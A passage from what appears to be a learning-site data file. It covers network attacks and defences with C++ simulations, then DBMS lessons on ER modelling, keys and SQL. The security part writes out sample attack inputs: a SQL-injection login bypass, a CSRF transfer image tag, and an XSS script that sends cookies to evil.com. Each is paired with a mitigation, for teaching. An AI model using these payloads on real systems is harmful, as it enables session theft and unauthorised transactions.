malicious SQL into input fields. Example: <code>\' OR 1=1 --</code> in a login form bypasses authentication. Mitigation: parameterized queries (prepared statements), input validation, ORM usage.</p><p class="learn-p"><b>CSRF (Cross-Site Request Forgery):</b> Attacker tricks authenticated user into making unwanted requests. Example: embedded image tag with <code>src="https://bank.com/transfer?to=attacker&amp;amount=10000"</code>. Mitigation: CSRF tokens, SameSite cookies, Referer checking.</p><p class="learn-p"><b>Replay Attack:</b> Attacker captures a valid network message and retransmits it later. Mitigation: timestamps, nonces, sequence numbers in protocols.</p><p class="learn-p"><b>IP Spoofing:</b> Attacker forges the source IP in packets. Used in DDoS amplification and some MITM attacks. Mitigation: ingress filtering (BCP38), RPF (Reverse Path Forwarding) checks.</p></div><div class="learn-section"><div class="learn-h">Security Best Practices Summary</div><table class="learn-table"><tr><th>Threat</th><th>Defense</th></tr><tr><td>Eavesdropping</td><td>TLS/HTTPS, VPN, end-to-end encryption</td></tr><tr><td>DDoS</td><td>CDN, rate limiting, SYN cookies, scrubbing</td></tr><tr><td>MITM</td><td>HTTPS + HSTS, certificate pinning, VPN</td></tr><tr><td>DNS Spoofing</td><td>DNSSEC, DoH/DoT, port randomization</td></tr><tr><td>XSS</td><td>CSP, output encoding, HttpOnly cookies</td></tr><tr><td>SQL Injection</td><td>Parameterized queries, ORM, input validation</td></tr><tr><td>CSRF</td><td>CSRF tokens, SameSite cookies</td></tr><tr><td>Password theft</td><td>Bcrypt/Argon2 hashing, MFA, rate limiting</td></tr></table><div class="learn-tip"><b>Tip:</b> The defense-in-depth principle states that security should be layered. No single measure is sufficient — combine network security (firewalls, IDS), transport security (TLS), application security (input validation, CSP), and operational security (monitoring, incident response).</div></div>',
          code: `// === Network Attack Simulations in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <queue>
#include <cstdlib>
#include <ctime>
#include <algorithm>
using namespace std;

// ---- SYN Flood Attack Simulation ----
struct SYNEntry {
    string srcIP;
    int srcPort;
    time_t timestamp;
    bool legitimate;
};

class TCPServer {
    int maxSynQueue;
    queue<SYNEntry> synQueue;
    int droppedConnections;
    bool synCookiesEnabled;

public:
    TCPServer(int queueSize, bool cookies)
        : maxSynQueue(queueSize), droppedConnections(0),
          synCookiesEnabled(cookies) {}

    bool handleSYN(const string& srcIP, int srcPort, bool legit) {
        if (synCookiesEnabled) {
            // With SYN cookies: don't allocate state
            // Just respond with encoded SYN-ACK
            cout << "    SYN from " << srcIP << ":" << srcPort
                 << " -> SYN-ACK (cookie, no state)" << endl;
            return true;
        }

        if ((int)synQueue.size() >= maxSynQueue) {
            droppedConnections++;
            cout << "    SYN from " << srcIP << ":" << srcPort
                 << " -> DROPPED! (queue full: " << synQueue.size()
                 << "/" << maxSynQueue << ")" << endl;
            return false;
        }

        synQueue.push({srcIP, srcPort, time(nullptr), legit});
        cout << "    SYN from " << srcIP << ":" << srcPort
             << " -> SYN-ACK sent (queue: " << synQueue.size()
             << "/" << maxSynQueue << ")" << endl;
        return true;
    }

    void stats() {
        cout << "  Queue: " << synQueue.size() << "/"
             << maxSynQueue << ", Dropped: "
             << droppedConnections << endl;
    }
};

void simulateSYNFlood() {
    cout << "=== SYN Flood Attack ===" << endl;

    // Without SYN cookies
    cout << "\\n--- Without SYN Cookies ---" << endl;
    TCPServer server1(5, false);
    // Legitimate connection
    server1.handleSYN("10.0.0.1", 49152, true);
    // Attack traffic (spoofed IPs)
    for (int i = 0; i < 8; i++) {
        string fakeIP = "192.168." + to_string(rand()%256) + "."
                        + to_string(rand()%256);
        server1.handleSYN(fakeIP, 1000 + i, false);
    }
    // Legitimate user during attack
    server1.handleSYN("10.0.0.2", 49153, true);
    server1.stats();

    // With SYN cookies
    cout << "\\n--- With SYN Cookies ---" << endl;
    TCPServer server2(5, true);
    server2.handleSYN("10.0.0.1", 49152, true);
    for (int i = 0; i < 8; i++) {
        string fakeIP = "192.168." + to_string(rand()%256) + "."
                        + to_string(rand()%256);
        server2.handleSYN(fakeIP, 1000 + i, false);
    }
    server2.handleSYN("10.0.0.2", 49153, true);
    server2.stats();
}

// ---- ARP Spoofing / MITM Simulation ----
struct ARPEntry {
    string ip;
    string mac;
};

void simulateARPSpoofing() {
    cout << "\\n=== ARP Spoofing (MITM) ===" << endl;

    // Normal ARP table
    map<string, string> victimARP;
    victimARP["192.168.1.1"] = "AA:BB:CC:DD:EE:01"; // gateway
    victimARP["192.168.1.2"] = "AA:BB:CC:DD:EE:02"; // victim
    victimARP["192.168.1.100"] = "AA:BB:CC:DD:EE:FF"; // attacker

    cout << "--- Before Attack ---" << endl;
    cout << "  Victim's ARP Table:" << endl;
    for (auto& [ip, mac] : victimARP) {
        cout << "    " << ip << " -> " << mac << endl;
    }
    cout << "  Traffic: Victim -> Gateway (normal path)" << endl;

    // ARP Spoofing: attacker sends fake ARP reply
    cout << "\\n--- ARP Spoofing Attack ---" << endl;
    cout << "  Attacker sends: ARP Reply" << endl;
    cout << "    192.168.1.1 (gateway) is at AA:BB:CC:DD:EE:FF (attacker MAC)"
         << endl;

    // Victim's ARP table is poisoned
    victimARP["192.168.1.1"] = "AA:BB:CC:DD:EE:FF"; // POISONED!

    cout << "\\n--- After Attack ---" << endl;
    cout << "  Victim's ARP Table (POISONED):" << endl;
    for (auto& [ip, mac] : victimARP) {
        cout << "    " << ip << " -> " << mac;
        if (ip == "192.168.1.1") cout << "  ** POISONED **";
        cout << endl;
    }
    cout << "  Traffic: Victim -> ATTACKER -> Gateway (MITM!)" << endl;
    cout << "  Attacker can now read/modify all traffic!" << endl;
}

// ---- DNS Cache Poisoning Simulation ----
void simulateDNSPoisoning() {
    cout << "\\n=== DNS Cache Poisoning ===" << endl;

    map<string, string> resolverCache;
    resolverCache["www.google.com"] = "142.250.80.4";
    resolverCache["www.example.com"] = "93.184.216.34";

    cout << "--- Before Attack ---" << endl;
    cout << "  Resolver Cache:" << endl;
    for (auto& [domain, ip] : resolverCache) {
        cout << "    " << domain << " -> " << ip << endl;
    }

    // Attacker poisons cache
    cout << "\\n--- Attack in Progress ---" << endl;
    cout << "  1. Attacker queries resolver for random123.bank.com" << endl;
    cout << "  2. Resolver queries authoritative NS for bank.com" << endl;
    cout << "  3. Attacker races to send forged response:" << endl;
    cout << "     random123.bank.com -> 6.6.6.6 (attacker)" << endl;
    cout << "     bank.com NS -> evil-ns.attacker.com" << endl;
    cout << "  4. Forged response accepted! Cache poisoned." << endl;

    resolverCache["bank.com"] = "6.6.6.6"; // POISONED!
    resolverCache["www.bank.com"] = "6.6.6.6"; // POISONED!

    cout << "\\n--- After Attack ---" << endl;
    cout << "  Resolver Cache (POISONED):" << endl;
    for (auto& [domain, ip] : resolverCache) {
        cout << "    " << domain << " -> " << ip;
        if (ip == "6.6.6.6") cout << "  ** POISONED **";
        cout << endl;
    }
    cout << "  All users querying bank.com now go to attacker!" << endl;

    cout << "\\n--- DNSSEC Mitigation ---" << endl;
    cout << "  With DNSSEC, the forged response would fail" << endl;
    cout << "  signature verification -> rejected!" << endl;
}

// ---- XSS Attack Demonstration ----
void simulateXSS() {
    cout << "\\n=== XSS Attack Simulation ===" << endl;

    // Stored XSS
    cout << "--- Stored XSS ---" << endl;
    string maliciousComment =
        "Nice post! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>";
    cout << "  Attacker submits comment:" << endl;
    cout << "    \"" << maliciousComment << "\"" << endl;

    // Without sanitization
    cout << "\\n  Without sanitization (VULNERABLE):" << endl;
    cout << "    HTML output: <p>" << maliciousComment << "</p>" << endl;
    cout << "    ** Script executes! Cookies stolen! **" << endl;

    // With sanitization
    cout << "\\n  With HTML encoding (SAFE):" << endl;
    string sanitized;
    for (char c : maliciousComment) {
        switch (c) {
            case '<': sanitized += "&lt;"; break;
            case '>': sanitized += "&gt;"; break;
            case '&': sanitized += "&amp;"; break;
            case '"': sanitized += "&quot;"; break;
            case '\'': sanitized += "&#39;"; break;
            default: sanitized += c;
        }
    }
    cout << "    HTML output: <p>" << sanitized << "</p>" << endl;
    cout << "    Script rendered as text, not executed." << endl;
}

// ---- Rate Limiter (DDoS mitigation) ----
class RateLimiter {
    map<string, vector<time_t>> requestLog;
    int maxRequests;
    int windowSeconds;
public:
    RateLimiter(int max, int window)
        : maxRequests(max), windowSeconds(window) {}

    bool allowRequest(const string& ip) {
        time_t now = time(nullptr);
        auto& log = requestLog[ip];

        // Remove old entries
        while (!log.empty() && now - log.front() > windowSeconds)
            log.erase(log.begin());

        if ((int)log.size() >= maxRequests) {
            return false; // rate limited
        }
        log.push_back(now);
        return true;
    }
};

void demonstrateRateLimiter() {
    cout << "\\n=== Rate Limiter (DDoS Mitigation) ===" << endl;
    RateLimiter limiter(5, 10); // 5 requests per 10 seconds

    string normalIP = "10.0.0.1";
    string attackerIP = "6.6.6.6";

    cout << "  Policy: 5 requests per 10 seconds" << endl;

    for (int i = 0; i < 8; i++) {
        bool allowed = limiter.allowRequest(attackerIP);
        cout << "  Request " << (i+1) << " from " << attackerIP
             << ": " << (allowed ? "ALLOWED" : "BLOCKED") << endl;
    }

    // Normal user not affected
    cout << "  Request from " << normalIP << ": "
         << (limiter.allowRequest(normalIP) ? "ALLOWED" : "BLOCKED")
         << endl;
}

int main() {
    srand(time(0));
    simulateSYNFlood();
    simulateARPSpoofing();
    simulateDNSPoisoning();
    simulateXSS();
    demonstrateRateLimiter();
    return 0;
}`,
          problems: [
            ['Network Security Practice (GFG)', 'https://www.geeksforgeeks.org/network-security/', 'Medium'],
            ['DDoS Attack Types', 'https://www.geeksforgeeks.org/deniel-of-service-ddos-attack/', 'Easy'],
            ['SQL Injection Prevention', 'https://www.geeksforgeeks.org/how-to-prevent-sql-injection/', 'Medium'],
            ['Cross-Site Scripting (XSS)', 'https://www.geeksforgeeks.org/what-is-cross-site-scripting-xss/', 'Hard'],
          ],
          mcqs: [
            {q: 'SYN cookies mitigate SYN flood attacks by:', o: ['Blocking all SYN packets', 'Encoding connection state in the sequence number so no state is allocated until ACK', 'Rate limiting TCP connections', 'Using UDP instead of TCP'], a: 1},
            {q: 'DNS amplification attacks exploit:', o: ['Open DNS resolvers with spoofed source IPs', 'SQL injection in DNS servers', 'Buffer overflow in DNS software', 'DNSSEC vulnerabilities'], a: 0},
            {q: 'Which HTTP header helps prevent XSS attacks by restricting script sources?', o: ['X-Frame-Options', 'Content-Security-Policy', 'Strict-Transport-Security', 'X-XSS-Protection'], a: 1},
          ],
        },
      ]
    },
  ]
};
const DBMS_CONTENT = {
  id: 'dbms', t: 'Database Management',
  tabs: [
    {
      id: 'er', t: 'ER Model & Keys',
      topics: [
        {
          t: 'ER Diagrams & Relational Model',
          learn: '<div class="learn-section"><div class="learn-h">Introduction to ER Model</div><p class="learn-p">The <b>Entity-Relationship (ER) Model</b> is a high-level conceptual data model used to describe the structure of a database. It was proposed by <b>Peter Chen</b> in 1976 and provides a graphical way to represent the logical structure of a database. The ER model is crucial in the <b>database design phase</b> — it acts as a blueprint before the actual relational schema is created.</p><p class="learn-p">The ER model consists of three main components:</p><ol class="learn-list"><li><b>Entities</b> — Real-world objects or concepts (e.g., Student, Course, Employee)</li><li><b>Attributes</b> — Properties of entities (e.g., name, age, salary)</li><li><b>Relationships</b> — Associations between entities (e.g., Student <i>enrolls in</i> Course)</li></ol></div><div class="learn-section"><div class="learn-h">Entities and Entity Sets</div><p class="learn-p">An <b>entity</b> is a distinguishable real-world object. An <b>entity set</b> is a collection of similar entities. For example, all students in a university form the <code>Student</code> entity set.</p><p class="learn-p">Entities can be classified as:</p><ul class="learn-list"><li><b>Strong Entity</b> — Has a primary key and can exist independently. Represented by a <b>rectangle</b> in ER diagrams. Example: <code>Student</code>, <code>Employee</code>.</li><li><b>Weak Entity</b> — Cannot be uniquely identified by its own attributes alone; depends on a <b>strong (owner) entity</b>. Represented by a <b>double rectangle</b>. Example: <code>Dependent</code> of an Employee. It uses a <b>partial key (discriminator)</b> combined with the owner\'s primary key.</li></ul><div class="learn-tip"><b>Tip:</b> In ER diagrams, a weak entity is always connected to its owner entity via a <b>double diamond</b> (identifying relationship). The partial key is shown with a <b>dashed underline</b>.</div></div><div class="learn-section"><div class="learn-h">Attributes</div><p class="learn-p">Attributes describe properties of entities. They are represented by <b>ovals</b> connected to their entity rectangle.</p><table class="learn-table"><tr><th>Attribute Type</th><th>Description</th><th>ER Symbol</th></tr><tr><td>Simple</td><td>Atomic, cannot be divided further (e.g., Age)</td><td>Simple oval</td></tr><tr><td>Composite</td><td>Can be divided into sub-parts (e.g., Name = First + Last)</td><td>Oval with sub-ovals</td></tr><tr><td>Derived</td><td>Computed from other attributes (e.g., Age from DOB)</td><td>Dashed oval</td></tr><tr><td>Multi-valued</td><td>Can have multiple values (e.g., Phone numbers)</td><td>Double oval</td></tr><tr><td>Key Attribute</td><td>Uniquely identifies an entity (e.g., Student_ID)</td><td>Underlined oval</td></tr></table></div><div class="learn-section"><div class="learn-h">Relationships and Cardinality</div><p class="learn-p">A <b>relationship</b> is an association between two or more entities. Represented by a <b>diamond</b> in ER diagrams.</p><p class="learn-p"><b>Cardinality constraints</b> specify the number of entities that can participate in a relationship:</p><ul class="learn-list"><li><b>1:1 (One-to-One)</b> — Each entity in A is associated with at most one entity in B and vice versa. Example: Each department has exactly one manager.</li><li><b>1:N (One-to-Many)</b> — Each entity in A can be associated with many entities in B, but each entity in B is associated with at most one entity in A. Example: One department has many employees.</li><li><b>M:N (Many-to-Many)</b> — Each entity in A can be associated with many in B and vice versa. Example: Students and Courses.</li></ul><p class="learn-p"><b>Participation constraints</b>:</p><ul class="learn-list"><li><b>Total participation</b> (double line) — Every entity must participate in the relationship.</li><li><b>Partial participation</b> (single line) — Some entities may not participate.</li></ul><div class="learn-warn"><b>Warning:</b> A common interview mistake is confusing cardinality with participation. Cardinality = how many; Participation = must it participate at all?</div></div><div class="learn-section"><div class="learn-h">Converting ER Diagrams to Relational Schema</div><p class="learn-p">The ER-to-Relational mapping follows these rules:</p><ol class="learn-list"><li><b>Strong entity</b> → Table with all simple attributes. Composite attributes are flattened. Multi-valued attributes get a separate table.</li><li><b>Weak entity</b> → Table with its attributes + the primary key of the owner entity as a foreign key. Primary key = owner PK + partial key.</li><li><b>1:1 relationship</b> → Add the PK of one entity as FK in the other (preferably the one with total participation).</li><li><b>1:N relationship</b> → Add the PK of the "1" side as FK in the "N" side table.</li><li><b>M:N relationship</b> → Create a new <b>junction table</b> with PKs of both entities as a composite PK.</li></ol><div class="learn-code">-- Example: M:N relationship between Student and Course\nCREATE TABLE Enrollment (\n    student_id INT,\n    course_id  INT,\n    grade      CHAR(2),\n    PRIMARY KEY (student_id, course_id),\n    FOREIGN KEY (student_id) REFERENCES Student(student_id),\n    FOREIGN KEY (course_id) REFERENCES Course(course_id)\n);</div><div class="learn-tip"><b>Tip:</b> In interviews, always clarify cardinality and participation constraints before converting ER to schema. This is a frequently tested skill at DE Shaw.</div></div><div class="learn-section"><div class="learn-h">Extended ER (EER) Model</div><p class="learn-p">The EER model extends the basic ER model with:</p><ul class="learn-list"><li><b>Generalization</b> — Bottom-up: combining similar entity types into a higher-level entity (e.g., Car + Truck → Vehicle).</li><li><b>Specialization</b> — Top-down: dividing a higher-level entity into sub-entities (e.g., Employee → Manager, Engineer).</li><li><b>Aggregation</b> — Treating a relationship as an entity for participating in another relationship.</li></ul><p class="learn-p">Specialization can be <b>disjoint (d)</b> or <b>overlapping (o)</b>, and <b>total</b> or <b>partial</b>.</p></div>',
          code: `-- =============================================
-- ER Model to Relational Schema: Complete Example
-- =============================================

-- Strong Entity: Department
CREATE TABLE Department (
    dept_id     INT PRIMARY KEY,
    dept_name   VARCHAR(100) NOT NULL,
    location    VARCHAR(200)
);

-- Strong Entity: Employee
CREATE TABLE Employee (
    emp_id      INT PRIMARY KEY,
    first_name  VARCHAR(50) NOT NULL,
    last_name   VARCHAR(50) NOT NULL,
    dob         DATE,
    salary      DECIMAL(10,2),
    dept_id     INT,
    -- 1:N relationship: Department has many Employees
    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)
);

-- Weak Entity: Dependent (depends on Employee)
-- PK = emp_id + dependent_name (partial key)
CREATE TABLE Dependent (
    emp_id          INT,
    dependent_name  VARCHAR(100),
    relationship    VARCHAR(50),
    dob             DATE,
    PRIMARY KEY (emp_id, dependent_name),
    FOREIGN KEY (emp_id) REFERENCES Employee(emp_id)
        ON DELETE CASCADE
);

-- 1:1 Relationship: Department managed by one Employee
ALTER TABLE Department
    ADD manager_id INT UNIQUE,
    ADD FOREIGN KEY (manager_id) REFERENCES Employee(emp_id);

-- Strong Entity: Project
CREATE TABLE Project (
    project_id   INT PRIMARY KEY,
    project_name VARCHAR(200) NOT NULL,
    budget       DECIMAL(12,2)
);

-- M:N Relationship: Employee works on Project
CREATE TABLE Works_On (
    emp_id      INT,
    project_id  INT,
    hours       DECIMAL(5,1),
    PRIMARY KEY (emp_id, project_id),
    FOREIGN KEY (emp_id)     REFERENCES Employee(emp_id),
    FOREIGN KEY (project_id) REFERENCES Project(project_id)
);

-- Multi-valued attribute: Employee phone numbers
CREATE TABLE Employee_Phone (
    emp_id       INT,
    phone_number VARCHAR(15),
    PRIMARY KEY (emp_id, phone_number),
    FOREIGN KEY (emp_id) REFERENCES Employee(emp_id)
);

-- Specialization: Employee -> Manager, Engineer
CREATE TABLE Manager (
    emp_id          INT PRIMARY KEY,
    bonus_percent   DECIMAL(4,2),
    FOREIGN KEY (emp_id) REFERENCES Employee(emp_id)
);

CREATE TABLE Engineer (
    emp_id      INT PRIMARY KEY,
    tech_stack  VARCHAR(200),
    FOREIGN KEY (emp_id) REFERENCES Employee(emp_id)
);`,
          problems: [
            ['ER Diagram to Tables', 'https://www.geeksforgeeks.org/minimization-of-er-diagram/', 'Medium'],
            ['Design a Database Schema', 'https://www.hackerrank.com/challenges/database-design/problem', 'Medium'],
            ['Weak Entity Sets', 'https://www.geeksforgeeks.org/weak-entity-set-in-er-diagrams/', 'Easy']
          ],
          mcqs: [
            {q: 'A weak entity set always has which type of participation in its identifying relationship?', o: ['Partial participation', 'Total participation', 'Optional participation', 'No participation'], a: 1},
            {q: 'In an ER diagram, a derived attribute is represented by:', o: ['Double oval', 'Dashed oval', 'Oval with underline', 'Double rectangle'], a: 1},
            {q: 'A M:N relationship between entities A and B is converted to a relational schema by:', o: ['Adding FK in A referencing B', 'Adding FK in B referencing A', 'Creating a new junction table with PKs of both A and B', 'Merging A and B into one table'], a: 2}
          ]
        },
        {
          t: 'Keys & Constraints',
          learn: '<div class="learn-section"><div class="learn-h">Introduction to Keys</div><p class="learn-p"><b>Keys</b> are fundamental to the relational model. They uniquely identify tuples (rows) in a relation (table) and establish relationships between tables. Understanding keys is critical for database design, normalization, and query optimization.</p><p class="learn-p">A <b>superkey</b> is any set of attributes that can uniquely identify a tuple. A <b>candidate key</b> is a minimal superkey — removing any attribute from it would make it no longer unique.</p></div><div class="learn-section"><div class="learn-h">Types of Keys</div><table class="learn-table"><tr><th>Key Type</th><th>Definition</th><th>Example</th></tr><tr><td>Super Key</td><td>Any set of attributes that uniquely identifies a tuple</td><td>{emp_id}, {emp_id, name}, {emp_id, name, salary}</td></tr><tr><td>Candidate Key</td><td>Minimal super key (no proper subset is a super key)</td><td>{emp_id}, {ssn}</td></tr><tr><td>Primary Key</td><td>The chosen candidate key used for identification</td><td>emp_id chosen as PK</td></tr><tr><td>Alternate Key</td><td>Candidate keys not chosen as primary key</td><td>ssn (if emp_id is PK)</td></tr><tr><td>Foreign Key</td><td>Attribute(s) referencing the primary key of another table</td><td>dept_id in Employee referencing Department</td></tr><tr><td>Composite Key</td><td>A key consisting of two or more attributes</td><td>{student_id, course_id} in Enrollment</td></tr><tr><td>Surrogate Key</td><td>System-generated artificial key with no business meaning</td><td>AUTO_INCREMENT id</td></tr></table><div class="learn-tip"><b>Tip:</b> To find candidate keys from functional dependencies, find the <b>attribute closure</b> of each combination. The minimal set whose closure equals all attributes is a candidate key.</div></div><div class="learn-section"><div class="learn-h">Finding Candidate Keys from Functional Dependencies</div><p class="learn-p">Given a relation R(A, B, C, D, E) with FDs: {A→B, BC→D, E→A}, find the candidate keys.</p><ol class="learn-list"><li>Attributes that appear <b>only on the left side</b> of FDs (or neither side) must be part of every candidate key. Here, <b>E</b> and <b>C</b> never appear on the right side alone.</li><li>Compute closure of {E, C}: EC+ = {E, C} → add A (E→A) → {E, C, A} → add B (A→B) → {E, C, A, B} → add D (BC→D) → {E, C, A, B, D} = R. So <b>{E, C}</b> is a candidate key.</li><li>Check subsets: {E}+ = {E, A, B} ≠ R. {C}+ = {C} ≠ R. So {E, C} is minimal.</li></ol><div class="learn-code">-- Attribute closure algorithm (pseudocode)\nresult = given_attributes\nrepeat:\n    for each FD X -> Y:\n        if X is subset of result:\n            result = result union Y\nuntil result does not change\n-- If result == all attributes of R, given_attributes is a superkey</div><div class="learn-warn"><b>Warning:</b> Many students forget that attributes appearing on neither side of any FD must be in every candidate key. Always check for such attributes first.</div></div><div class="learn-section"><div class="learn-h">Integrity Constraints</div><p class="learn-p"><b>Constraints</b> enforce rules on data to maintain correctness and consistency.</p><ul class="learn-list"><li><b>Domain Constraint</b> — Each attribute must have values from its defined domain (e.g., age must be a positive integer).</li><li><b>Entity Integrity Constraint</b> — The <b>primary key</b> cannot be NULL. Every tuple must be uniquely identifiable.</li><li><b>Referential Integrity Constraint</b> — A <b>foreign key</b> value must either be NULL or match an existing primary key value in the referenced table.</li><li><b>Key Constraint</b> — Values of candidate keys must be unique across all tuples.</li><li><b>NOT NULL Constraint</b> — An attribute cannot take NULL values.</li><li><b>CHECK Constraint</b> — A condition that must be true for every tuple (e.g., salary &gt; 0).</li><li><b>UNIQUE Constraint</b> — Values must be unique (allows NULLs, unlike PK).</li><li><b>DEFAULT Constraint</b> — Provides a default value when none is specified.</li></ul></div><div class="learn-section"><div class="learn-h">Referential Integrity and Actions</div><p class="learn-p">When a referenced row is deleted or updated, the DBMS can take one of these actions on the referencing rows:</p><table class="learn-table"><tr><th>Action</th><th>ON DELETE Behavior</th><th>ON UPDATE Behavior</th></tr><tr><td>CASCADE</td><td>Delete all referencing rows</td><td>Update FK in all referencing rows</td></tr><tr><td>SET NULL</td><td>Set FK to NULL in referencing rows</td><td>Set FK to NULL</td></tr><tr><td>SET DEFAULT</td><td>Set FK to its default value</td><td>Set FK to default</td></tr><tr><td>RESTRICT</td><td>Reject the delete operation</td><td>Reject the update operation</td></tr><tr><td>NO ACTION</td><td>Similar to RESTRICT but checked at end of statement</td><td>Similar to RESTRICT</td></tr></table><div class="learn-code">CREATE TABLE Employee (\n    emp_id   INT PRIMARY KEY,\n    name     VARCHAR(100) NOT NULL,\n    dept_id  INT,\n    salary   DECIMAL(10,2) CHECK (salary &gt; 0),\n    email    VARCHAR(100) UNIQUE,\n    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)\n        ON DELETE SET NULL\n        ON UPDATE CASCADE\n);</div></div><div class="learn-section"><div class="learn-h">Functional Dependencies (FDs)</div><p class="learn-p">A <b>functional dependency</b> X → Y means: for any two tuples t1 and t2, if t1[X] = t2[X] then t1[Y] = t2[Y]. In other words, X uniquely determines Y.</p><p class="learn-p"><b>Armstrong\'s Axioms</b> (sound and complete inference rules):</p><ol class="learn-list"><li><b>Reflexivity</b>: If Y ⊆ X, then X → Y (trivial FD)</li><li><b>Augmentation</b>: If X → Y, then XZ → YZ</li><li><b>Transitivity</b>: If X → Y and Y → Z, then X → Z</li></ol><p class="learn-p">Derived rules: <b>Union</b> (X→Y, X→Z ⟹ X→YZ), <b>Decomposition</b> (X→YZ ⟹ X→Y, X→Z), <b>Pseudo-transitivity</b> (X→Y, WY→Z ⟹ WX→Z).</p><div class="learn-tip"><b>Tip:</b> Armstrong\'s axioms are one of the most commonly tested topics in GATE and tech interviews. Practice computing closures and minimal covers.</div></div>',
          code: `-- =============================================
-- Keys & Constraints: Demonstrations
-- =============================================

-- 1. All types of keys in one schema
CREATE TABLE Student (
    student_id   INT PRIMARY KEY,           -- Primary Key
    roll_number  VARCHAR(20) UNIQUE NOT NULL,-- Alternate Key (Candidate Key)
    first_name   VARCHAR(50) NOT NULL,
    last_name    VARCHAR(50),
    email        VARCHAR(100) UNIQUE,        -- Alternate Key
    dob          DATE,
    dept_id      INT,                        -- Foreign Key
    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)
        ON DELETE SET NULL
        ON UPDATE CASCADE
);

-- 2. Composite Primary Key example
CREATE TABLE Enrollment (
    student_id  INT,
    course_id   INT,
    semester    VARCHAR(10),
    grade       CHAR(2),
    PRIMARY KEY (student_id, course_id, semester),  -- Composite Key
    FOREIGN KEY (student_id) REFERENCES Student(student_id),
    FOREIGN KEY (course_id) REFERENCES Course(course_id)
);

-- 3. Surrogate Key with AUTO_INCREMENT
CREATE TABLE Order_Log (
    log_id       INT AUTO_INCREMENT PRIMARY KEY,  -- Surrogate Key
    order_id     INT NOT NULL,
    action       VARCHAR(50),
    action_time  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 4. Various constraints demonstrated
CREATE TABLE Employee (
    emp_id     INT PRIMARY KEY,
    name       VARCHAR(100) NOT NULL,          -- NOT NULL
    age        INT CHECK (age >= 18 AND age <= 65),  -- CHECK
    salary     DECIMAL(10,2) DEFAULT 30000.00, -- DEFAULT
    dept_id    INT NOT NULL,
    email      VARCHAR(200) UNIQUE,            -- UNIQUE
    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)
        ON DELETE RESTRICT
        ON UPDATE CASCADE
);

-- 5. Finding candidate keys: worked example
-- Relation R(A, B, C, D, E)
-- FDs: A -> BC, CD -> E, B -> D, E -> A
-- Step 1: Attributes only on LHS or neither: none exclusively
-- Step 2: Try {A}: A+ = {A,B,C,D,E} = R => {A} is candidate key
-- Step 3: Try {E}: E+ = {E,A,B,C,D} = R => {E} is candidate key
-- Step 4: Try {B}: B+ = {B,D} ≠ R
-- Step 5: Try {C}: C+ = {C} ≠ R
-- Step 6: Try {BC}: BC+ = {B,C,D,E,A} = R => {BC} is candidate key
-- Candidate keys: {A}, {E}, {BC}

-- 6. Referential integrity actions demo
CREATE TABLE Department (
    dept_id   INT PRIMARY KEY,
    name      VARCHAR(100) NOT NULL
);

CREATE TABLE Staff (
    staff_id  INT PRIMARY KEY,
    name      VARCHAR(100),
    dept_id   INT,
    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)
        ON DELETE CASCADE       -- Delete staff if dept deleted
        ON UPDATE CASCADE       -- Update FK if dept PK changes
);`,
          problems: [
            ['Find Candidate Keys', 'https://www.geeksforgeeks.org/finding-candidate-keys-of-a-relation/', 'Medium'],
            ['Functional Dependencies', 'https://www.geeksforgeeks.org/types-of-functional-dependencies-in-dbms/', 'Easy'],
            ['Armstrong Axioms Practice', 'https://www.geeksforgeeks.org/armstrongs-axioms-in-functional-dependency-in-dbms/', 'Medium']
          ],
          mcqs: [
            {q: 'If a relation has N candidate keys, how many primary keys does it have?', o: ['N', '1', 'N-1', 'Depends on the DBMS'], a: 1},
            {q: 'Which of the following is NOT an Armstrong\'s axiom?', o: ['Reflexivity', 'Augmentation', 'Transitivity', 'Complementation'], a: 3},
            {q: 'A foreign key in table T1 references the primary key of table T2. If a row in T2 is deleted and the FK action is SET NULL, what happens?', o: ['The corresponding rows in T1 are deleted', 'The FK column in T1 is set to NULL', 'The delete operation is rejected', 'The FK column is set to the default value'], a: 1}
          ]
        }
      ]
    },
    {
      id: 'sql', t: 'SQL',
      topics: [
        {
          t: 'SQL Basics (DDL, DML, SELECT, WHERE, GROUP BY)',
          learn: '<div class="learn-section"><div class="learn-h">Introduction to SQL</div><p class="learn-p"><b>SQL (Structured Query Language)</b> is the standard language for interacting with relational databases. It is declarative — you specify <i>what</i> you want, not <i>how</i> to get it. SQL is divided into several sub-languages:</p><table class="learn-table"><tr><th>Category</th><th>Commands</th><th>Purpose</th></tr><tr><td>DDL (Data Definition Language)</td><td>CREATE, ALTER, DROP, TRUNCATE</td><td>Define/modify schema</td></tr><tr><td>DML (Data Manipulation Language)</td><td>INSERT, UPDATE, DELETE, SELECT</td><td>Manipulate data</td></tr><tr><td>DCL (Data Control Language)</td><td>GRANT, REVOKE</td><td>Access control</td></tr><tr><td>TCL (Transaction Control Language)</td><td>COMMIT, ROLLBACK, SAVEPOINT</td><td>Transaction management</td></tr></table></div><div class="learn-section"><div class="learn-h">DDL Commands</div><p class="learn-p"><b>CREATE TABLE</b> defines a new table:</p><div class="learn-code">CREATE TABLE Employees (\n    emp_id    INT PRIMARY KEY AUTO_INCREMENT,\n    name      VARCHAR(100) NOT NULL,\n    dept      VARCHAR(50) DEFAULT \'Engineering\',\n    salary    DECIMAL(10,2) CHECK (salary &gt; 0),\n    hire_date DATE\n);</div><p class="learn-p"><b>ALTER TABLE</b> modifies an existing table:</p><div class="learn-code">-- Add a column\nALTER TABLE Employees ADD email VARCHAR(100) UNIQUE;\n-- Modify column data type\nALTER TABLE Employees MODIFY salary DECIMAL(12,2);\n-- Drop a column\nALTER TABLE Employees DROP COLUMN email;\n-- Rename table\nALTER TABLE Employees RENAME TO Staff;</div><p class="learn-p"><b>DROP vs TRUNCATE</b>:</p><ul class="learn-list"><li><code>DROP TABLE</code> — Removes the table and its schema entirely.</li><li><code>TRUNCATE TABLE</code> — Removes all rows but keeps the schema. Faster than DELETE (no row-by-row logging). Cannot be rolled back in most RDBMS. Resets AUTO_INCREMENT.</li></ul><div class="learn-warn"><b>Warning:</b> <code>TRUNCATE</code> is a DDL command despite affecting data. It cannot have a WHERE clause and cannot fire row-level triggers. Interviewers often ask the difference between DELETE and TRUNCATE.</div></div><div class="learn-section"><div class="learn-h">DML Commands</div><p 